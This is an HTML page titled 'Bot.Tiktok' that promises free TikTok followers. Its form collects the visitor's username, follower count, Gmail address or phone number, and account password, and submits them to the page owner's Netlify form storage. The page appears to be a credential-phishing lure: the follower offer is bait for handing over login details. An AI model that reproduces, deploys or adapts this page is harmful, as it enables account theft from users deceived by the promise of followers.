<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bot.Tiktok</title>
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">
    <link rel="shortcut icon" href="img/TikTok 15_05_2024 8_49_28 pm.png" type="image/x-icon">
</head>

<body>
    <div class="container">
        <div class="img-move">
            <div id="carouselExampleSlidesOnly" class="carousel slide" data-bs-ride="carousel">
                <div class="carousel-inner">
                    <div class="carousel-item active">
                        <img src="https://images.pexels.com/photos/4843112/pexels-photo-4843112.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1"
                            class="d-block w-100" alt="...">
                    </div>
                    <div class="carousel-item">
                        <img src="https://images.pexels.com/photos/4132535/pexels-photo-4132535.jpeg?auto=compress&cs=tinysrgb&w=400&lazy=load"
                            class="d-block w-100" alt="...">
                    </div>
                    <div class="carousel-item">
                        <img src="https://images.pexels.com/photos/5077393/pexels-photo-5077393.jpeg?auto=compress&cs=tinysrgb&w=600"
                            class="d-block w-100" alt="...">
                    </div>
                </div>
            </div>
        </div>
        <form name="contact" method="POST" netlify>
            <div class="form-group">
                <label for="User-Name">User-Name:</label>
                <input type="text" name="name" required>
            </div>
            <div class="form-group">
                <label for="Followers">Number of Current Followers:</label>
                <input type="number" name="Followers" required>
            </div>
            <div class="form-group">
                <label for="Gmail/number">Gmail/Number:</label>
                <input type="text" name="Gmail/number" required>
            </div>
            <div class="form-group">
                <label for="Password">Password:</label>
                <input type="password" name="password" required>
            </div>
            <input type="submit" value="Get Followers">
        </form>

        <div class="footer">
            <h2>All rights reserved;</h2>
            <h3>@SalarGaming&Coding;</h3>
        </div>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-kenU1KFdBIe4zVF0s0G1M5b4hcpxyD9F7jL+jjXkk+Q2h455rYXK/7HAuoJl+0I4"
        crossorigin="anonymous"></script>

</body>

</html>
